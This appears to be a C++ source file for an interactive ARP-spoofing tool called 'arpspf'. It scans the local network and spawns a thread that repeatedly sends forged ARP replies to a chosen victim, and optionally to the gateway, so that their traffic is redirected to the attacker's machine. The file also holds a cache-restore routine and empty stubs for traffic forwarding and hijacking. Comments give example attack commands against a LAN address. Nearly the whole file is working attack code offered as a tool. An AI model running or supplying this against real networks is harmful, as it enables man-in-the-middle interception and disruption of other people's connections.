/*
 * Arguments:
 * victim's ip
 * how many packets
 * time interval
 * device name
 */


#include "arpspf.h"
#include "hdrs.h"
#include "netinfo.h"

#include <set>

#include <wordexp.h>
#include <vector>

using namespace kni;

#define APP_NAME "arpspf"

void *thread_spoof(void *);

typedef void (*arpspf_func)(int, char *[]);

void arpspf_exit(int, char **);

void arpspf_spoof_start(int, char **);

void arpspf_spoof_stop(int, char **);

void arpspf_scan_lan(int, char **);

void arpspf_forward(int, char **);

void arpspf_hijack(int, char **);

void arpspf_device(int, char **);

void fatal_error(const char *src, const char *err);


netinfo *netdb;
int keep_looping = 1;


struct {
    int npackets{};
    int seconds{};
    bool twoway{};
    std::string victim_ip{};
    mac_t victim_mac{};

    bool to_be_running{false};
    pthread_t thread_id{};
} thread_spoof_args;




int main(int argc, char *argv[]) {
    if (argc == 1) {
        fatal_error(APP_NAME, "missing device name");
    } else if (strcmp(argv[1], "lo") == 0) {
        fatal_error(APP_NAME, "using lo doesn't make sense");
    }

    const size_t errbufsize = 1024;
    std::unique_ptr<char[]> errbuf(new char[errbufsize]);

    netdb = new netinfo(errbuf.get(), errbufsize);
    if (!netdb->set_dev(argv[1]) || !netdb->update_gateway_ip()) {
        fatal_error(APP_NAME, netdb->error());
    }

    std::map<std::string, arpspf_func> arpspf_cmd;

    arpspf_cmd["exit"] = arpspf_exit;
    arpspf_cmd["scan"] = arpspf_scan_lan;
    arpspf_cmd["dev"] = arpspf_device;
    arpspf_cmd["start"] = arpspf_spoof_start;
    arpspf_cmd["stop"] = arpspf_spoof_stop;
    arpspf_cmd["fwd"] = arpspf_forward;
    arpspf_cmd["hij"] = arpspf_hijack;

    arpspf_device(0, nullptr);
    arpspf_scan_lan(0, nullptr);

    while (keep_looping) {
        KNI_OUTPUT("> ");

        int bytes;
        char *line_buf = nullptr, dmt;
        size_t bufsize = 0;

        if ((bytes = static_cast<int>(getline(&line_buf, &bufsize, stdin))) > 1) {
            /*
             * According to getline's man page(http://man7.org/linux/man-pages/man3/getline.3.html),
             * the buffer is null-terminated and includes the newline character, if one was found.
             *
             * The pointer line_buf must either be nullptr or contain a malloc-allocated memory address.
             */
            dmt = line_buf[bytes - 1];
            line_buf[bytes - 1] = 0;
            KNI_LOG_DEBUG("command line \"%s\"", line_buf);

            wordexp_t we{};
            int we_ret = wordexp(line_buf, &we, 0);
            for (int i = 0; i < we.we_wordc; ++i)
                KNI_LOG_DEBUG("passing argv[%d]=%s", i, we.we_wordv[i]);

            if (we_ret == 0) {
                std::string name(we.we_wordv[0]);
                if (arpspf_cmd.count(name)) {
                    arpspf_cmd[name](static_cast<int>(we.we_wordc), we.we_wordv);
                } else {
                    KNI_LOG_ERROR("\"%s\" not found.", we.we_wordv[0]);
                }
            } else if (we_ret != WRDE_BADCHAR && we_ret != WRDE_SYNTAX) {
                keep_looping = 0;
            }

            wordfree(&we);
            line_buf[bytes - 1] = dmt;
        }

        /*
         * According to getline's man page(http://man7.org/linux/man-pages/man3/getline.3.html),
         * the buffer should be freed by the user program even if getline() failed.
         */
        free(line_buf);
    }

    delete netdb;
    return 0;
}

/*
 * use a map<string, mac> to store ip:mac pairs returned by nmap
 * sc - scan LAN ips using nmap
 *      sc

 * fwd - forward network traffic between hosts
 *      fwd 192.168.225.187
 */

void arpspf_exit(int argc, char **argv) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);

    keep_looping = false;
}


void *thread_spoof(void *) {
    auto args = &thread_spoof_args;

    char err_buf[PCAP_ERRBUF_SIZE] = {0};
    u_char pkt_buf[ETHER_HDR_LEN + ARP_HDR_LEN] = {0};

    arp_io_packet arp_io(pkt_buf, err_buf);

    if (!arp_io.open(netdb->devname)) {
        KNI_LOG_ERROR("failed to open device \"%s\" :%s", netdb->devname.c_str(), arp_io.error());
        return nullptr;
    } else {
        KNI_LOG_DEBUG("device \"%s\" opened successfully.", netdb->devname.c_str());;
    }

    KNI_LOG_DEBUG("ip=%s secs=%d pkts=%d twoway=%d", args->victim_ip.c_str(), args->seconds, args->npackets,
                  args->twoway);
    KNI_OUTPUT_LF("Spoofing %s(%s)...", to_string(args->victim_mac).c_str(), args->victim_ip.c_str());

    int count = 0;
    while (args->to_be_running) {
        bool succ = arp_io.reply(netdb->gateway_ip, netdb->devinfo.hw_addr, args->victim_ip, args->victim_mac);
        if (succ && args->twoway)
            succ = arp_io.reply(args->victim_ip, netdb->devinfo.hw_addr, netdb->gateway_ip, netdb->gateway_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io.error());

        // If args->npackets < 0 then it becomes an infinite loop
        if (++count == args->npackets)
            break;
        else
            sleep(static_cast<unsigned int>(args->seconds));
    }

    KNI_LOG_DEBUG("restoring ARP...");

    for (int i = 0; i < 5; ++i) {
        bool succ = arp_io.reply(netdb->gateway_ip, netdb->gateway_mac, args->victim_ip, args->victim_mac);
        if (succ && args->twoway)
            succ = arp_io.reply(args->victim_ip, args->victim_mac, netdb->gateway_ip, netdb->gateway_mac);

        if (!succ)
            KNI_LOG_ERROR("%s", arp_io.error());

        if (i != args->npackets - 1)
            sleep(static_cast<unsigned int>(3));
    }

    arp_io.close();
    KNI_LOG_DEBUG("device \"%s\" closed", netdb->devname.c_str());

    return nullptr;
}

/*
 * start - perform LAN arp spoofing on a given host
 *
 * start 192.168.225.187 -n 5 -c 100
 *      Target on 192.168.225.187 and send 100 packets at 5-second intervals
 * start 192.168.225.187 11:22:33:44:55:66 -t
 *      Use user-provided MAC address if the host is not detected by "scan".
 *      Send fake packets to both victim and gateway
 * start 192.168.225.187 -d
 *      Perform attack in another thread and loop until "stop"
 *
 */
void arpspf_spoof_start(int argc, char **argv) {
    KNI_LOG_DEBUG("%s(argc=%d):", __FUNCTION__, argc);
    if (thread_spoof_args.to_be_running) {
        KNI_OUTPUT_LF("Thread is already running");
        return;
    }

    optind = 1; // https://stackoverflow.com/a/15179990/8706476

    int opt;
    int seconds = 10, npackets = 10;
    bool twoway = false;
    while ((opt = getopt(argc, argv, "n:c:td")) != -1) {
        switch (opt) {
            case 'n':
                seconds = atoi(optarg);
                break;
            case 'c':
                npackets = atoi(optarg);
                break;
            case 't':
                twoway = true;
                break;
            case 'd':
                npackets = -1;
            default:
                break;
        }
    }

    bool wait_thread = (npackets >= 0);

    argc -= optind;
    argv += optind;

    if (seconds <= 0) {
        KNI_OUTPUT_LF("Invalid arguments.");
        return;
    }

    if (argc == 0) {
        KNI_OUTPUT_LF("Missing an IP address.");
        return;
    }

    char ipbuf[16];
    if (inet_pton(AF_INET, argv[0], ipbuf) == 0) {
        KNI_OUTPUT_LF("\"%s\" doesn't contain a valid IPv4 address", argv[0]);
        return;
    }

    std::string victim_ip(argv[0]);
    mac_t victim_mac;

    if (netdb->cached(victim_ip) == 0) {
        KNI_OUTPUT_LF("Host %s not detected.", argv[0]);

        if (argc == 1) {
            KNI_OUTPUT_LF("Missing an MAC address. Run \"scan\" to discover LAN hosts.");
            return;

        } else if (mac_pton(argv[1], &victim_mac) == 0) {
            KNI_OUTPUT_LF("\"%s\" is not a valid MAC address\n", argv[1]);
            return;

        }
        KNI_OUTPUT_LF("Using user-supplied MAC \"%s\"\n", argv[1]);

    } else if (victim_ip == netdb->gateway_ip) {
        KNI_OUTPUT_LF("An ip address except the gateway's is required.\n");
        return;

    } else {
        victim_mac = netdb->map(victim_ip);
    }

    thread_spoof_args.victim_ip = victim_ip;
    thread_spoof_args.twoway = twoway;
    thread_spoof_args.victim_mac = victim_mac;
    thread_spoof_args.npackets = npackets;
    thread_spoof_args.seconds = seconds;
    thread_spoof_args.to_be_running = true;


    int ret = pthread_create(
            &thread_spoof_args.thread_id,
            nullptr,
            thread_spoof,
            nullptr
    );

    if (ret != 0) {
        KNI_LOG_ERROR("pthread_create() returns %d:%s", ret, strerror(ret));
        return;
    }

    if (wait_thread) {
        pthread_join(thread_spoof_args.thread_id, nullptr);
        thread_spoof_args.to_be_running = false;
    } else {
        sleep(2); // attempt to avoid the competion of another thread's output and the "prompt string one"
    }
}

void arpspf_scan_lan(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);

    if (netdb->update_gateway_ip() == -1) {
        KNI_LOG_ERROR("%s", netdb->error());
        return;
    }

    KNI_OUTPUT_LF("Scanning hosts...");

    if (netdb->update_arp()) {
        for (auto &p: netdb->mapping()) {
            KNI_OUTPUT_LF("ip: %s\t- mac: %s", p.first.c_str(), to_string(p.second).c_str());
        }
    } else {
        KNI_LOG_ERROR("%s", netdb->error());
    }

}

void arpspf_forward(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);
}

void arpspf_hijack(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);
}

void arpspf_device(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);

    KNI_OUTPUT_LF("Gateway: %s", netdb->gateway_ip.c_str());

    KNI_OUTPUT_LF("Device \"%s\":", netdb->devname.c_str());

    auto netenv = &(netdb->devinfo);
    KNI_OUTPUT_LF("\tHWaddr:%s Bcast:%s",
                  to_string(netenv->hw_addr).c_str(),
                  to_string(netenv->hw_bcast).c_str());
    KNI_OUTPUT_LF("\tinet addr:%s Bcast:%s Mask:%s",
                  to_string(netenv->ip).c_str(),
                  to_string(netenv->ip_bcast).c_str(),
                  to_string(netenv->ip_netmask).c_str());
}

/**
 * Stop an existing attack in another thread
 */
void arpspf_spoof_stop(int, char **) {
    KNI_LOG_DEBUG("%s()", __FUNCTION__);

    if (!thread_spoof_args.to_be_running)
        KNI_OUTPUT_LF("Thread is not running");
    else {
        thread_spoof_args.to_be_running = false;
        pthread_join(thread_spoof_args.thread_id, nullptr);
        KNI_OUTPUT_LF("Thread exits.");
    }

}

